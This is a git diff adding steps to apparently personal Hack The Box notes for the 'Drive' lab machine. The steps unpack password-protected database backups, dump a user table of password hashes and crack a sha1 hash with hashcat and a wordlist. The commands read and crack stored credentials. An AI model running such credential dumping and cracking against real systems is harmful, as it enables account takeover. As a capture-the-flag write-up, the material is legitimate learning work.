@@ -21,8 +21,30 @@
 11. martin@drive:~$ 7z e -p'H@ckThisP@ssW0rDIfY0uC@n:)' ./1_Sep_db_backup.sqlite3.7z -so > /home/martin/Sep.sqlite3
 12. martin@drive:~$ sqlite3 Dec.sqlite3
 	.tables
-	
-13. 
+	select * from accounts_customuser;
+  (sqlite> SELECT * from accounts_customuser;
+  16|pbkdf2_sha256$390000$ZjZj164ssfwWg7UcR8q4kZ$KKbWkEQCpLzYd82QUBq65aA9j3+IkHI6KK9Ue8nZeFU=|2022-12-26 06:21:34.294890|1|admin|||admin@drive.htb|1|1|2022-12-08 14:59:02.802351
+ ***)
+ Which is pbkdf2_sha256, an industry-standard hashing algorithm, cannot brute-force
+13. Choose another database, cmd: sqlite3 Oct.sqlite3
+    sqlite> select * from accounts_customuser;
+	21|sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a|2022-12-26 05:48:27.497873|0|jamesMason|||jamesMason@drive.htb|0|1|2022-12-23 12:33:04
+	22|sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f|2022-12-24 12:55:10|0|martinCruz|||martin@drive.htb|0|1|2022-12-23 12:35:02
+	23|sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141|2022-12-26 06:02:42.401095|0|tomHands|||tom@drive.htb|0|1|2022-12-23 12:37:45
+	24|sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f|2022-12-24 16:51:53|0|crisDisel|||cris@drive.htb|0|1|2022-12-23 12:39:15
+	30|sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3|2022-12-26 05:43:40.388717|1|admin|||admin@drive.htb|1|1|2022-12-26 05:30:58.003372
+    (sha1 is insecure)
+14. sqlite> select password from accounts_customuser;
+sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
+sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
+sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141
+sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
+sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
+ (save the hash to file "hash.txt")
+15. #hashcat -a 0 -m 124 -o cracked-hashs hash.txt /usr/share/wordlists/rockyou.txt
+  #cat cracked-hashs 
+  sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141:johniscool
+16. 
 ```
 
 ## HTB: Gofer (gdb related)
